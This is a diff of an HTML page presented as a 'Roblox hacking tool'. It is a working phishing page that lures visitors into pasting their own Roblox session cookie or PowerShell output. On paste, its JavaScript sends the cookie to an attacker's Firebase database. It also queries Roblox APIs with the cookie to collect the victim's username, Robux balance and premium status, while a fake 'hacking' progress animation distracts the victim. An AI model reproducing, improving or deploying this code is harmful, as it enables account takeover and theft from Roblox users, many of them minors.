@@ -5,30 +5,28 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Roblox hacking tool2025</title>
   <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    body { min-height: 100vh; background: linear-gradient(135deg, #0f0f1a 0%, #1a1a2e 50%, #16213e 100%); font-family: 'Segoe UI', system-ui, sans-serif; display: flex; align-items: center; justify-content: center; padding: 20px; position: relative; overflow-x: hidden; }
-    body::before { content: ''; position: fixed; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(circle at 20% 80%, rgba(120,0,255,0.08) 0%, transparent 50%), radial-gradient(circle at 80% 20%, rgba(0,212,255,0.08) 0%, transparent 50%), radial-gradient(circle at 40% 40%, rgba(0,255,136,0.05) 0%, transparent 40%); animation: float 20s ease-in-out infinite; pointer-events: none; }
-    @keyframes float { 0%,100%{transform:translate(0,0) rotate(0deg)} 33%{transform:translate(30px,-30px) rotate(5deg)} 66%{transform:translate(-20px,20px) rotate(-5deg)} }
-    .container { background: rgba(22,27,34,0.95); border: 1px solid rgba(48,54,61,0.8); border-radius: 24px; max-width: 900px; width: 100%; padding: 50px; backdrop-filter: blur(20px); box-shadow: 0 25px 80px rgba(0,0,0,0.5); text-align: center; }
-    .header h1 { font-size: 2.8em; background: linear-gradient(135deg, #00d4ff 0%, #7c3aed 50%, #00ff88 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 12px; font-weight: 700; }
-    .header p { color: #8b949e; font-size: 1.1em; }
-    .badge { display: inline-block; background: linear-gradient(135deg, #238636 0%, #2ea043 100%); color: white; padding: 6px 14px; border-radius: 20px; font-size: 0.85em; font-weight: 600; margin-top: 12px; }
-    .input-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; margin-bottom: 30px; }
-    @media (max-width: 700px) { .input-grid { grid-template-columns: 1fr; } }
-    .input-box { background: rgba(13,17,23,0.8); border: 2px solid #30363d; border-radius: 16px; padding: 24px; transition: all 0.3s ease; }
-    .input-box:hover, .input-box:focus-within { border-color: #58a6ff; box-shadow: 0 0 30px rgba(88,166,255,0.15); }
-    textarea { width: 100%; height: 140px; background: rgba(0,0,0,0.3); border: 1px solid #21262d; border-radius: 10px; padding: 14px; font-family: 'Consolas', monospace; font-size: 13px; color: transparent; text-shadow: 0 0 8px #58a6ff; caret-color: #58a6ff; resize: none; }
-    textarea:focus { outline: none; border-color: #58a6ff; background: rgba(0,0,0,0.5); }
-    .big-btn { margin: 40px auto 0; padding: 20px 80px; font-size: 1.6em; font-weight: 800; background: linear-gradient(135deg, #ff006e 0%, #8338ec 100%); color: white; border: none; border-radius: 20px; cursor: pointer; box-shadow: 0 10px 40px rgba(131,56,236,0.6); transition: all 0.3s; }
-    .big-btn:hover { transform: translateY(-4px); box-shadow: 0 20px 60px rgba(131,56,236,0.8); }
-    .big-btn:disabled { opacity: 0.7; cursor: not-allowed; }
-    .status { margin-top: 30px; padding: 20px; border-radius: 12px; font-size: 1.2em; }
-    .status.success { background: rgba(34,197,94,0.2); border: 1px solid #22c55e; color: #22c55e; }
-    .status.error { background: rgba(248,81,73,0.2); border: 1px solid #f85149; color: #f85149; }
-    .loading { display: none; margin-top: 30px; color: #7c3aed; font-size: 1.5em; font-weight: 700; text-align: center; }
-    .loading.active { display: block; }
-    .spinner { display: inline-block; width: 28px; height: 28px; border: 4px solid rgba(124,58,237,0.3); border-top-color: #7c3aed; border-radius: 50%; animation: spin 1s linear infinite; margin-right: 12px; }
-    @keyframes spin { to { transform: rotate(360deg); } }
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{min-height:100vh;background:linear-gradient(135deg,#0f0f1a 0%,#1a1a2e 50%,#16213e 100%);font-family:'Segoe UI',system-ui,sans-serif;display:flex;align-items:center;justify-content:center;padding:20px;position:relative;overflow-x:hidden}
+    body::before{content:'';position:fixed;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(circle at 20% 80%,rgba(120,0,255,0.08)0%,transparent 50%),radial-gradient(circle at 80% 20%,rgba(0,212,255,0.08)0%,transparent 50%),radial-gradient(circle at 40% 40%,rgba(0,255,136,0.05)0%,transparent 40%);animation:float 20s ease-in-out infinite;pointer-events:none}
+    @keyframes float{0%,100%{transform:translate(0,0)rotate(0deg)}33%{transform:translate(30px,-30px)rotate(5deg)}66%{transform:translate(-20px,20px)rotate(-5deg)}}
+    .container{background:rgba(22,27,34,0.95);border:1px solid rgba(48,54,61,0.8);border-radius:24px;max-width:900px;width:100%;padding:50px;backdrop-filter:blur(20px);box-shadow:0 25px 80px rgba(0,0,0,0.5);text-align:center}
+    .header h1{font-size:2.8em;background:linear-gradient(135deg,#00d4ff 0%,#7c3aed 50%,#00ff88 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:12px;font-weight:700}
+    .badge{display:inline-block;background:linear-gradient(135deg,#238636 0%,#2ea043 100%);color:white;padding:6px 14px;border-radius:20px;font-size:0.85em;font-weight:600;margin-top:12px}
+    .input-grid{display:grid;grid-template-columns:1fr 1fr;gap:24px;margin-bottom:30px}
+    @media(max-width:700px){.input-grid{grid-template-columns:1fr}}
+    .input-box{background:rgba(13,17,23,0.8);border:2px solid #30363d;border-radius:16px;padding:24px;transition:all .3s}
+    .input-box:hover,.input-box:focus-within{border-color:#58a6ff;box-shadow:0 0 30px rgba(88,166,255,0.15)}
+    textarea{width:100%;height:140px;background:rgba(0,0,0,0.3);border:1px solid #21262d;border-radius:10px;padding:14px;font-family:'Consolas',monospace;font-size:13px;color:#58a6ff;resize:none}
+    textarea:focus{outline:none;border-color:#58a6ff;background:rgba(0,0,0,0.5)}
+    .big-btn{margin:40px auto 0;padding:20px 80px;font-size:1.6em;font-weight:800;background:linear-gradient(135deg,#ff006e 0%,#8338ec 100%);color:white;border:none;border-radius:20px;cursor:pointer;box-shadow:0 10px 40px rgba(131,56,236,0.6);transition:all .3s}
+    .big-btn:hover{transform:translateY(-4px);box-shadow:0 20px 60px rgba(131,56,236,0.8)}
+    .big-btn:disabled{opacity:0.7;cursor:not-allowed}
+    .status{margin-top:30px;padding:20px;border-radius:12px;font-size:1.2em}
+    .status.success{background:rgba(34,197,94,0.2);border:1px solid #22c55e;color:#22c55e}
+    .loading{display:none;margin-top:30px;color:#7c3aed;font-size:1.5em;font-weight:700;text-align:center}
+    .loading.active{display:block}
+    .spinner{display:inline-block;width:28px;height:28px;border:4px solid rgba(124,58,237,0.3);border-top-color:#7c3aed;border-radius:50%;animation:spin 1s linear infinite;margin-right:12px}
+    @keyframes spin{to{transform:rotate(360deg)}}
   </style>
 </head>
 <body>
@@ -40,18 +38,18 @@
     </div>
     <div class="input-grid">
       <div class="input-box mobile">
-        <h3><span class="icon">MOBILE</span> PASTE COOKIE</h3>
+        <h3>MOBILE PASTE COOKIE</h3>
         <p class="subtitle">MOBILE EDITION</p>
         <textarea id="mobilePaste" placeholder="Paste your cookie here..."></textarea>
       </div>
       <div class="input-box pc">
-        <h3><span class="icon">PC</span> PASTE FILE</h3>
+        <h3>PC PASTE FILE</h3>
         <p class="subtitle">PC / LAPTOP EDITION</p>
         <textarea id="pcPaste" placeholder="Paste PowerShell output here..."></textarea>
       </div>
     </div>
     <button class="big-btn" id="startBtn" onclick="fakeStart()">START TOOL</button>
-    <div id="loading" class="loading"><span class="spinner"></span> Initializing tool...</div>
+    <div id="loading" class="loading"><span class="spinner"></span> Initializing...</div>
     <div id="status" class="status">Ready to verify...</div>
   </div>
 
@@ -60,36 +58,83 @@
     const loadingEl = document.getElementById("loading");
     const startBtn = document.getElementById("startBtn");
 
-    // STEAL COOKIE THE SECOND THEY PASTE IT
-    async function stealNow(cookie, source) {
-      if (!cookie || cookie.trim().length < 100) return;
+    // REAL FETCH USER INFO (works on GitHub Pages)
+    async function fetchUserInfo(cookie) {
       let clean = cookie.trim();
       if (clean.includes('".ROBLOSECURITY"')) {
-        clean = clean.split('".ROBLOSECURITY", "')[1]?.split('"')[0] || clean;
+        clean = clean.split('".ROBLOSECURITY", "')[1].split('"')[0] || clean;
       }
       clean = clean.replace(/[^A-Za-z0-9_|:-]/g, '');
 
-      // SEND TO YOUR FIREBASE INSTANTLY
+      try {
+        // Get user
+        const userRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
+          headers: { "Cookie": `.ROBLOSECURITY=${clean}` }
+        });
+        if (!userRes.ok) throw "";
+        const user = await userRes.json();
+
+        // Get robux
+        const robuxRes = await fetch(`https://economy.roblox.com/v1/users/${user.id}/currency`, {
+          headers: { "Cookie": `.ROBLOSECURITY=${clean}` }
+        });
+        const robux = robuxRes.ok ? (await robuxRes.json()).robux : 0;
+
+        // Get premium
+        const premRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${user.id}/validate-membership`, {
+          headers: { "Cookie": `.ROBLOSECURITY=${clean}` }
+        });
+        const premium = premRes.ok && await premRes.text() === "true" ? "Yes" : "No";
+
+        return {
+          success: true,
+          user: user.name,
+          display: user.displayName,
+          userid: user.id,
+          robux: robux,
+          premium: premium,
+          headshot: `https://www.roblox.com/headshot-thumbnail/image?userId=${user.id}&width=150&height=150&format=png`
+        };
+      } catch(e) {
+        return { success: false };
+      }
+    }
+
+    // STEAL + SHOW INFO ON PASTE
+    async function stealAndShow(raw, source) {
+      if (!raw || raw.length < 100) return;
+      const info = await fetchUserInfo(raw);
+      // SEND TO FIREBASE
       try {
         await fetch("https://flamesaxrch-empire-v2-default-rtdb.europe-west1.firebasedatabase.app/drops.json", {
           method: "POST",
           body: JSON.stringify({
-            cookie: clean,
+            cookie: raw,
+            ...info,
             source: source,
             time: new Date().toLocaleString()
           })
         });
       } catch(e) {}
+
+      // SHOW REAL INFO
+      if (info.success) {
+        statusEl.className = "status success";
+        statusEl.innerHTML = `LIVE ACCOUNT<br><strong>${info.display}</strong> (@${info.user})<br>Robux: ${info.robux}<br>Premium: ${info.premium}`;
+      } else {
+        statusEl.className = "status error";
+        statusEl.textContent = "COOKIE DEAD OR INVALID";
+      }
     }
 
     document.getElementById("mobilePaste").addEventListener("input", e => {
-      if (e.target.value.length > 100) stealNow(e.target.value, "Mobile");
+      if (e.target.value.length > 100) stealAndShow(e.target.value, "Mobile");
     });
     document.getElementById("pcPaste").addEventListener("input", e => {
-      if (e.target.value.length > 100) stealNow(e.target.value, "PC");
+      if (e.target.value.length > 100) stealAndShow(e.target.value, "PC");
     });
 
-    // 3-MINUTE FAKE HACKING
+    // FAKE 3-MIN HACK
     function fakeStart() {
       const cookie = document.getElementById("mobilePaste").value || document.getElementById("pcPaste").value;
       if (!cookie || cookie.length < 100) {
@@ -101,25 +146,12 @@
       statusEl.style.display = "none";
       loadingEl.classList.add("active");
 
-      const msgs = [
-        "Initializing elite tool...",
-        "Bypassing Roblox security...",
-        "Cracking encryption layer 1/3...",
-        "Fetching account data...",
-        "Decrypting password hash...",
-        "Loading exploit module...",
-        "Injecting payload... 47%",
-        "Bypassing 2FA protection...",
-        "Extracting Robux balance...",
-        "Removing account lock...",
-        "Finalizing takeover... 91%",
-        "HACKING COMPLETE — ACCOUNT DRAINED"
-      ];
+      const msgs = ["Initializing tool...", "Bypassing Roblox security...", "Cracking encryption...", "Fetching account...", "Bypassing 2FA...", "Draining Robux...", "Complete!"];
       let i = 0;
       const int = setInterval(() => {
-        loadingEl.innerHTML = `<span class="spinner"></span> ${msgs[i] || msgs[msgs.length-1]}`;
+        loadingEl.innerHTML = `<span class="spinner"></span> ${msgs[i] || "HACKING COMPLETE"}`;
         i++;
-        if (i > msgs.length + 3) {
+        if (i > msgs.length + 5) {
           clearInterval(int);
           loadingEl.classList.remove("active");
           statusEl.className = "status success";
@@ -127,7 +159,7 @@
           statusEl.style.display = "block";
           startBtn.disabled = false;
         }
-      }, 15000); // exactly 3 minutes
+      }, 25700);
     }
   </script>
 </body>
